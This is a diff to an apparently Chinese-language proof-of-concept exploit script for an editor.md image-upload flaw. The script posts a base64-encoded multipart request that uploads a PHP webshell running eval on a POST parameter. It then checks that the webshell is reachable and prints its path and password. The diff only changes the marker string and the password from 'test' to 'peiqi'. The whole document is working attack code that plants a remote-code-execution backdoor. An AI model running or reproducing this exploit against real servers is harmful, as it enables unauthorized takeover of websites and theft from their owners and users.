@@ -20,7 +20,7 @@ def POC_1(target_url):
             "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)",
             "Content-Type": "multipart/form-data; boundary=--------------------------921378126371623762173617"
     }
-    data = base64.b64decode("LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTkyMTM3ODEyNjM3MTYyMzc2MjE3MzYxNwpDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9ImVkaXRvcm1kLWltYWdlLWZpbGUiOyBmaWxlbmFtZT0idGVzdC48PnBocCIKQ29udGVudC1UeXBlOiB0ZXh0L3BsYWluCgo8P3BocCBlY2hvICd0ZXN0X3Rlc3QnO0BldmFsKCRfUE9TVFt0ZXN0XSk/PgotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tOTIxMzc4MTI2MzcxNjIzNzYyMTczNjE3LS0=")
+    data = base64.b64decode("LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTkyMTM3ODEyNjM3MTYyMzc2MjE3MzYxNwpDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9ImVkaXRvcm1kLWltYWdlLWZpbGUiOyBmaWxlbmFtZT0idGVzdC48PnBocCIKQ29udGVudC1UeXBlOiB0ZXh0L3BsYWluCgo8P3BocCBlY2hvICdwcV90ZXN0JztAZXZhbCgkX1BPU1RbcGVpcWldKT8+Ci0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS05MjEzNzgxMjYzNzE2MjM3NjIxNzM2MTctLQ==")
     try:
         requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
         response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=5)
@@ -28,9 +28,9 @@ def POC_1(target_url):
             webshell_url = re.findall(r'"url":"(.*?)"', response.text)[0]
             webshell_url = webshell_url.replace('\\','')
             response = requests.get(url=webshell_url, headers=headers,verify=False, timeout=5)
-            if "test_test" in response.text and response.status_code == 200:
+            if "pq_test" in response.text and response.status_code == 200:
                 print("\033[32m[o] 目标 {}存在漏洞 ,成功上传木马 \n[o] 路径为 {}\033[0m".format(target_url, webshell_url))
-                print("\033[32m[o] 密码为: test \033[0m")
+                print("\033[32m[o] 密码为: peiqi \033[0m")
             else:
                 print("\033[31m[x] 请求失败 \033[0m")
                 sys.exit(0)
